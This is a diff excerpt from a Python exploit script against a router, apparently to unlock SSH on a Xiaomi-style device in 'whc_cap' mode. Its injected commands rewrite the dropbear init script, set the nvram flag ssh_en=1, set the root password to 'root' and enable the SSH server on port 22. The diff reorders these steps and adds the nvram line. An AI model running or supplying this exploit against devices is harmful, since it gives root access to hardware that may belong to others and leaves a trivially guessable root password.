@@ -50,10 +50,11 @@ if '"netmode":4,' not in res:
   die('It is necessary to reorganize the device into "whc_cap" mode!')
 
 #res = exec_cmd('logger hello_world_3335556_')
-res = exec_cmd("sed -i 's/`nvram get ssh_en`/1/g' /etc/init.d/dropbear")
+res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
 if '"code":0' not in res:
   die('Exploit not working!!!')
-res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
+#res = exec_cmd("sed -i 's/`nvram get ssh_en`/1/g' /etc/init.d/dropbear")
+res = exec_cmd("nvram set ssh_en=1; nvram commit")
 res = exec_cmd("(echo root; sleep 1; echo root) | passwd root")
 res = exec_cmd("/etc/init.d/dropbear enable")
 print('Run SSH server on port 22 ...')
